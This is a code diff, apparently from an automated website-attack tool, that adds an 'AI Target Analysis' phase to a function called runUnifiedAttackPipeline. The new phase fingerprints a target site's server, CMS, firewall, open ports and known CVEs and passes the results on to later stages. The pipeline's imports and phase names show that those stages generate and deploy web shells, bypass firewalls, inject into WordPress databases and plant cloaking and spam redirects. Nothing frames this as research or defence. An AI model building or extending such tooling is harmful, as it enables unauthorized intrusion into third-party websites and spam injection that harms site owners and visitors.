@@ -8,6 +8,7 @@
  * This is the "brain" that makes Autonomous Friday + SEO Spam work together.
  */
 import { preScreenTarget, type PreScreenResult } from "./ai-prescreening";
+import { runAiTargetAnalysis, type AiTargetAnalysis, type AnalysisStep } from "./ai-target-analysis";
 import { fullVulnScan, type VulnScanResult, type RankedAttackVector, type ServerInfo, type CmsDetection } from "./ai-vuln-analyzer";
 import { generateShellsForTarget, pickBestShell, generateUnconditionalHtmlRedirect, generateUnconditionalHtaccessRedirect, generateMetaRedirectHtml, generateJsRedirect, type GeneratedShell, type ShellGenerationConfig } from "./ai-shell-generator";
 import { oneClickDeploy, type DeployResult, type DeployOptions, type ProgressEvent as DeployProgressEvent } from "./one-click-deploy";
@@ -62,7 +63,7 @@ export interface PipelineConfig {
 }
 
 export interface PipelineEvent {
-  phase: "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update" | "shellless" | "email";
+  phase: "ai_analysis" | "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update" | "shellless" | "email";
   step: string;
   detail: string;
   progress: number; // 0-100
@@ -115,6 +116,8 @@ export interface PipelineResult {
   cdnUploadResult?: CdnUploadResult | null;
   telegramSent?: boolean;
   emailSent?: boolean;
+  // AI Target Analysis (Phase 0)
+  aiTargetAnalysis?: AiTargetAnalysis | null;
 }
 
 type EventCallback = (event: PipelineEvent) => void;
@@ -688,20 +691,68 @@ export async function runUnifiedAttackPipeline(
   let prescreen: PreScreenResult | null = null;
   let vulnScan: VulnScanResult | null = null;
 
+  // ─── Phase 0: AI Target Analysis (NEW — deep intelligence before attack) ───
+  let aiTargetAnalysis: AiTargetAnalysis | null = null;
+  try {
+    onEvent({
+      phase: "ai_analysis",
+      step: "start",
+      detail: `🧠 Phase 0: AI Target Analysis — วิเคราะห์เว็บเป้าหมาย ${config.targetUrl} อย่างละเอียด...`,
+      progress: 0,
+    });
+
+    aiTargetAnalysis = await Promise.race([
+      runAiTargetAnalysis(
+        config.targetUrl.replace(/^https?:\/\//, "").replace(/\/$/, ""),
+        (step: AnalysisStep) => {
+          // Stream each analysis step to frontend
+          onEvent({
+            phase: "ai_analysis",
+            step: step.stepId,
+            detail: `🧠 [${step.stepName}] ${step.detail}`,
+            progress: Math.round(step.progress * 0.12), // Scale 0-100 to 0-12 (Phase 0 = 12% of total)
+            data: {
+              analysisStep: step,
+            },
+          });
+        },
+      ),
+      new Promise<AiTargetAnalysis>((_, reject) => setTimeout(() => reject(new Error("AI analysis timeout (90s)")), 90000)),
+    ]);
+
+    aiDecisions.push(`AI Analysis: ${aiTargetAnalysis.httpFingerprint.serverType || "Unknown"} server, CMS: ${aiTargetAnalysis.techStack.cms || "none"}, WAF: ${aiTargetAnalysis.security.wafDetected || "none"}, DA: ${aiTargetAnalysis.seoMetrics.domainAuthority}, Success: ${aiTargetAnalysis.aiStrategy.overallSuccessProbability}%`);
+
+    onEvent({
+      phase: "ai_analysis",
+      step: "complete",
+      detail: `✅ AI Analysis เสร็จ — Server: ${aiTargetAnalysis.httpFingerprint.serverType || "Unknown"}, CMS: ${aiTargetAnalysis.techStack.cms || "none"}, WAF: ${aiTargetAnalysis.security.wafDetected || "none"} (${aiTargetAnalysis.security.wafStrength}), DA: ${aiTargetAnalysis.seoMetrics.domainAuthority}, โอกาสสำเร็จ: ${aiTargetAnalysis.aiStrategy.overallSuccessProbability}%`,
+      progress: 12,
+      data: { aiTargetAnalysis },
+    });
+  } catch (error: any) {
+    errors.push(`AI Target Analysis failed: ${error.message}`);
+    onEvent({
+      phase: "ai_analysis",
+      step: "error",
+      detail: `⚠️ AI Analysis ล้มเหลว: ${error.message} — ดำเนินการต่อด้วย pre-screen แบบเดิม`,
+      progress: 12,
+    });
+  }
+
   onEvent({
     phase: "prescreen",
     step: "start",
     detail: `🔍 เริ่มวิเคราะห์เป้าหมาย: ${config.targetUrl}`,
-    progress: 0,
+    progress: 12,
   });
 
-  // ─── Phase 1: Pre-screening ───
+  // ─── Phase 1: Pre-screening (uses AI analysis data if available) ───
   try {
     onEvent({
       phase: "prescreen",
       step: "scanning",
-      detail: "🔍 Phase 1: AI Pre-screening — วิเคราะห์ server, CMS, WAF, ports...",
-      progress: 5,
+      detail: "🔍 Phase 1: Pre-screening — ตรวจสอบเพิ่มเติมจาก AI analysis...",
+      progress: 13,
     });
 
     prescreen = await Promise.race([
@@ -709,13 +760,39 @@ export async function runUnifiedAttackPipeline(
       new Promise<PreScreenResult>((_, reject) => setTimeout(() => reject(new Error("prescreen timeout")), 60000)),
     ]);
 
+    // Merge AI analysis data into prescreen if available
+    if (aiTargetAnalysis && prescreen) {
+      // Enrich prescreen with AI analysis data
+      if (!prescreen.serverType && aiTargetAnalysis.httpFingerprint.serverType) {
+        prescreen.serverType = aiTargetAnalysis.httpFingerprint.serverType;
+      }
+      if (!prescreen.cms && aiTargetAnalysis.techStack.cms) {
+        prescreen.cms = aiTargetAnalysis.techStack.cms;
+        prescreen.cmsVersion = aiTargetAnalysis.techStack.cmsVersion;
+      }
+      if (!prescreen.wafDetected && aiTargetAnalysis.security.wafDetected) {
+        prescreen.wafDetected = aiTargetAnalysis.security.wafDetected;
+        prescreen.wafStrength = aiTargetAnalysis.security.wafStrength;
+      }
+      if (!prescreen.hostingProvider && aiTargetAnalysis.dnsInfo.hostingProvider) {
+        prescreen.hostingProvider = aiTargetAnalysis.dnsInfo.hostingProvider;
+      }
+      if (!prescreen.ipAddress && aiTargetAnalysis.dnsInfo.ipAddress) {
+        prescreen.ipAddress = aiTargetAnalysis.dnsInfo.ipAddress;
+      }
+      // Use AI strategy probability if it's more informed
+      if (aiTargetAnalysis.aiStrategy.overallSuccessProbability > 0) {
+        prescreen.overallSuccessProbability = aiTargetAnalysis.aiStrategy.overallSuccessProbability;
+      }
+    }
+
     aiDecisions.push(`Pre-screen: ${prescreen.serverType || "Unknown"} server, CMS: ${prescreen.cms || "none"}, WAF: ${prescreen.wafDetected || "none"}, Success probability: ${prescreen.overallSuccessProbability}%`);
 
     onEvent({
       phase: "prescreen",
       step: "complete",
       detail: `✅ Pre-screen เสร็จ — Server: ${prescreen.serverType || "Unknown"}, CMS: ${prescreen.cms || "none"}, WAF: ${prescreen.wafDetected || "none"}, โอกาสสำเร็จ: ${prescreen.overallSuccessProbability}%`,
-      progress: 15,
+      progress: 18,
       data: { prescreen },
     });
 
@@ -724,11 +801,11 @@ export async function runUnifiedAttackPipeline(
       phase: "world_update",
       step: "prescreen_done",
       detail: "World state updated from pre-screen",
-      progress: 15,
+      progress: 18,
       data: {
         hosts: 1,
-        ports: 0,
-        vulns: 0,
+        ports: aiTargetAnalysis?.uploadSurface.openPorts.length || 0,
+        vulns: aiTargetAnalysis?.vulnerabilities.knownCVEs.length || 0,
         creds: 0,
         uploadPaths: prescreen.writablePaths?.length || 0,
         shellUrls: 0,
@@ -742,7 +819,7 @@ export async function runUnifiedAttackPipeline(
       phase: "prescreen",
       step: "error",
       detail: `⚠️ Pre-screen ล้มเหลว: ${error.message} — ดำเนินการต่อด้วยข้อมูลจำกัด`,
-      progress: 15,
+      progress: 18,
     });
   }
 
@@ -2090,6 +2167,8 @@ export async function runUnifiedAttackPipeline(
     // Injection & CDN results
     injectionResult: injectionResult || undefined,
     cdnUploadResult: cdnUploadResult || undefined,
+    // AI Target Analysis (Phase 0)
+    aiTargetAnalysis: aiTargetAnalysis || undefined,
   };
 
   if (fullSuccess) {
